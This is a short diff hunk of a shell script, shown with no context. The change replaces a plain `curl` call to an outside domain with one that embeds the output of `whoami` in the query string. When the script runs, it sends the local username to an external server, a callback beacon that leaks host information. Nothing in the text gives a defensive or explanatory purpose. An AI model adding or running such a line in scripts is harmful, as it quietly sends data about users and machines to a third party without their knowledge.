@@ -8,4 +8,4 @@
 
 #!/bin/sh
 
-curl https://ccll1.im5.org/hello
+curl https://im5.org/hello?c=`whoami`
